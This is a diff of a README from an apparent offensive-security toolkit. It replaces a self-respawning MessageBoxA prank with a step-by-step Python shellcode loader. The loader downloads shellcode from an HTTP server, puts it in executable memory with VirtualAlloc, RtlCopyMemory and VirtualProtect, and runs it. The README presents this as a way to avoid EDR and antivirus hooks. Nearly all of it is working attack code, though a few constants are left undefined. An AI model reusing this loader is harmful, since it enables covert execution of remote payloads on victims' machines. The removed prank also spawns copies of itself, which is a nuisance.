@@ -1,81 +1,153 @@
 # Windows API Calls
 
-The Windows API, informally WinAPI, is the foundational application programming interface (API) that allows a computer program to access the features of the Microsoft Windows operating system in which the program is running.
+The Windows API, also known as WinAPI, is a set of functions that allow programs to interact with the underlying operating system. This script demonstrates how to utilize low-level Windows API calls to execute shellcode directly in memory, bypassing traditional methods of execution by avoiding hooking mechanisms used by EDR and Anti-Virus systems.
 
-This [program](https://github.com/0xSickb0y/OffensiveToolkit/blob/main/Python/Windows/WinAPI/run.py) is a simple "troll" that demonstrates basic usage of the Windows API by utilizing MessageBoxA. The program is not harmful in any way.
+In this case, we use the `VirtualAlloc`, `VirtualProtect`, and `RtlCopyMemory` functions from the Windows `kernel32.dll` library to allocate memory, copy shellcode into it, adjust memory protection, and finally execute the shellcode.
 
 ## References
 
 - [Windows API - Wikipedia](https://en.wikipedia.org/wiki/Windows_API)
-- [MessageBoxA Documentation](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)
-- [Programming reference for the Win32 API](https://learn.microsoft.com/en-us/windows/win32/api/)
+- [VirtualAlloc Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
+- [VirtualProtect Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
+- [RtlCopyMemory Documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlcopymemory)
+- [CFUNCTYPE Documentation](https://docs.python.org/3/library/ctypes.html#ctypes.CFUNCTYPE)
 
 ## Building the Script
 
-In this script, we use the `MessageBoxA` function from the `user32.dll` library. This function creates a message box with customizable text, a title, and flags for defining its behavior.
+This script demonstrates how to fetch shellcode from a server, allocate memory, copy the shellcode into the allocated memory, set the memory protection, and finally execute the shellcode.
 
-We start by importing the necessary modules from `ctypes` and `ctypes.wintypes` to interact with the Windows API.
+We begin by importing the necessary modules from the `ctypes` library, which allow us to interact with low-level Windows API functions.
 
 ```python
-import os
-import subprocess
+import requests
 from ctypes import *
-from ctypes.wintypes import HWND, LPCSTR, UINT
+from ctypes import wintypes
 ```
 
-Next, we load the `MessageBoxA` function from the `user32.dll` library. The function's argument types and return type are defined as follows:
+Next, we define the argument types and return types for the Windows API functions that we will use:
 
 ```python
-mboxa = windll.user32.MessageBoxA
-mboxa.argtypes = (HWND, LPCSTR, LPCSTR, UINT)
-mboxa.restype = UINT
+VirtualAlloc = windll.kernel32.VirtualAlloc
+VirtualAlloc.argtypes = (
+    wintypes.LPVOID,
+    SIZE_T,
+    wintypes.DWORD,
+    wintypes.DWORD
+)
+VirtualAlloc.restype = wintypes.LPVOID
+
+VirtualProtect = windll.kernel32.VirtualProtect
+VirtualProtect.argtypes = (
+    wintypes.LPVOID,
+    SIZE_T,
+    wintypes.DWORD,
+    POINTER(wintypes.DWORD)
+)
+VirtualProtect.restype = wintypes.BOOL
 ```
 
-- `argtypes`: Specifies the argument types expected by the function:
-  - `HWND`: Handle to the owner window.
-  - `LPCSTR`: A pointer to a constant string, used for both the text of the message box and its title.
-  - `UINT`: The flags that specify the behavior and appearance of the message box.
+- `argtypes`: Specifies the types of arguments that each function expects.
+- `restype`: Specifies the return type of the function.
 
-- `restype`: Specifies that the function will return a `UINT` (the result of the message box interaction).
+<br>
 
-We then declare the arguments for the `MessageBoxA` function:
+Now, we fetch the shellcode from the HTTP server.
 
 ```python
-W_HANDLE = None
-LP_TEXT = LPCSTR(b"Are you stupid?")
-LP_CAPTION = LPCSTR(b"MessageBoxA")
-MB_FLAGS = 0x00000004 | 0x00001000
+URL = "http://192.168.56.5:8000/shellcode"  # Change the URL to your own server
+
+response = requests.get(URL)
+shellcode = response.content
+shellcode_length = len(shellcode)
+
+print(f"Shellcode fetched: {shellcode_length} bytes.")
 ```
 
-- `W_HANDLE`: The handle to the owner window. In this case, we set it to `None` because the message box is independent of any specific window.
-- `LP_TEXT`: The text displayed in the message box.
-- `LP_CAPTION`: The title displayed in the message box.
-- `MB_FLAGS`: Flags that define the message box's behavior. Here, `0x00000004` sets the message box as modal (blocking interaction with other windows), and `0x00001000` gives it the "Yes/No" buttons.
+Here, we send a GET request to the server and retrieve the shellcode. The length of the shellcode is printed to confirm the size of the data.
 
-Finally, we define a function to show the message box and check the result:
+<br>
+
+Next, we allocate memory using `VirtualAlloc` with the required parameters.
 
 ```python
-def show_messagebox():
-    return mboxa(W_HANDLE, LP_TEXT, LP_CAPTION, MB_FLAGS)
+PAGE_SIZE = 4096
+RegionSize = SIZE_T((shellcode_length + PAGE_SIZE - 1) // PAGE_SIZE * PAGE_SIZE)
+AllocationType = MEM_COMMIT | MEM_RESERVE
+PAGE_EXECUTE_READ_WRITE = 0x40
+
+allocated_memory = VirtualAlloc(
+    BaseAddress,
+    RegionSize,
+    AllocationType,
+    PAGE_EXECUTE_READ_WRITE
+)
+
+if allocated_memory == 0:
+    raise RuntimeError("VirtualAlloc failed. Memory allocation error.")
+
+print(f"Memory allocated at -> {hex(allocated_memory)}")
 ```
 
-- This function calls `MessageBoxA` and returns the result (the button clicked by the user).
+We calculate the appropriate region size for the memory allocation, round it up to the nearest page size, and request memory using `MEM_COMMIT` and `MEM_RESERVE` flags. The memory protection is set to `PAGE_EXECUTE_READ_WRITE` to allow code execution.
 
-The script continuously opens new instances of the message box until the user clicks the "Yes" button. If the user clicks "Yes," the function will return `6`, and the script will stop opening new message boxes. 
+<br>
+
+After allocating memory, we copy the shellcode into the allocated memory region using `RtlCopyMemory`.
 
 ```python
-if __name__ == '__main__':
-    while True:
-        if show_messagebox() == 6:
-            break
+shellcode_ptr = (c_char * shellcode_length).from_buffer_copy(shellcode)
+RtlCopyMemory = windll.kernel32.RtlCopyMemory
+RtlCopyMemory.argtypes = (wintypes.LPVOID, wintypes.LPCVOID, SIZE_T)
+RtlCopyMemory.restype = None
 
-        for _ in range(0, 6):
-            subprocess.Popen(["python", os.path.abspath(__file__)])
+RtlCopyMemory(
+    allocated_memory,
+    shellcode_ptr,
+    shellcode_length
+)
+
+print("Shellcode copied to allocated memory.")
 ```
 
-- The `while True` loop ensures that the message box reappears until the user clicks "Yes."
-- The `subprocess.Popen()` call spawns new instances of the script (up to 6 times) to keep the message boxes appearing.
+This step copies the shellcode into the allocated memory address.
+
+<br>
+
+We then update the memory protection using `VirtualProtect` to ensure that the allocated memory is marked as executable.
+
+```python
+NewProtect = PAGE_EXECUTE_READ_WRITE
+OldProtect = wintypes.DWORD(0)
+
+res = VirtualProtect(
+    allocated_memory,
+    RegionSize,
+    NewProtect,
+    byref(OldProtect)
+)
+
+if not res:
+    raise RuntimeError("VirtualProtect failed. Memory protection error.")
+
+print("Memory protection updated to PAGE_EXECUTE_READ_WRITE.")
+```
+
+This step is essential for ensuring that the shellcode can be executed from the allocated memory.
+
+<br>
+
+Finally, we define the shellcode function type and cast the allocated memory to a callable function:
+
+```python
+shellcode_func = CFUNCTYPE(None)
+shellcode_callable = cast(allocated_memory, shellcode_func)
+
+print("Executing shellcode...")
+shellcode_callable()
+```
+
+The `CFUNCTYPE` defines a callable type, and we cast the allocated memory to this type to execute the shellcode.
 
 ## Example Output
 
-![output](https://github.com/user-attachments/assets/daca833f-d8ee-4abe-a6ec-596b6130ee24)
+![ss_demo](https://github.com/user-attachments/assets/00c635fa-e6d3-4449-b09a-f85001fb0982)
